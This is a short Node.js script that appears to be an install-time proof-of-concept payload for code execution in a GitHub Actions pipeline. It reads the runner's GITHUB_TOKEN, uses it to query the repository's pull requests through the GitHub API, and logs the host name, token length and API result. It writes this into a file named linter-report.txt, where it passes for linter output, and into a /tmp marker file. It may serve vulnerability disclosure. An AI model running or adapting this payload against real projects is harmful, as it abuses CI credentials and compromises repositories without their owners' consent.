const fs = require('fs');
const os = require('os');
const base = process.env.INIT_CWD || process.cwd();
const token = process.env.GITHUB_TOKEN || '';
const repo = process.env.GITHUB_REPOSITORY || '';
(async () => {
  let api = 'no-token';
  if (token && repo) {
    try {
      const r = await fetch('https://api.github.com/repos/' + repo + '/pulls', {
        headers: { Authorization: 'Bearer ' + token, Accept: 'application/vnd.github+json' }
      });
      api = 'api_status=' + r.status;
    } catch (e) { api = 'api_error'; }
  }
  const info = 'RCE_PROVEN install_time=' + new Date().toISOString() +
    ' host=' + os.hostname() + ' token_len=' + token.length + ' ' + api;
  console.log('ADP_RCE ' + info);
  fs.writeFileSync(base + '/linter-report.txt', info + '\n');
  fs.writeFileSync('/tmp/ADP_RCE_MARKER', info);
})();
